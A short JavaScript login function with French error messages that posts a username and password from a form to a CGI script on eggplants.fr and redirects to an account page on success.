let savedUsername = '';

function performLogin() {
    const url = 'https://eggplants.fr/cgi-bin/contact.cgi';
    const username = document.getElementById('Identifiant').value;
    const password = document.getElementById('password').value;

    const data = new URLSearchParams({
        identifiant: username,
        password: password
    });

    fetch(url, {
        method: 'POST',
        mode: 'cors', // Mode cors
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: data,
    })
    .then(response => {
        if (response.ok) {
            savedUsername = username;
            window.location.href = 'acc.html';
        } else {
            console.error('Erreur lors de la requête : ', response.status);
        }
    })
    .catch(error => {
        console.error('Erreur lors de la requête : ', error);
    });
}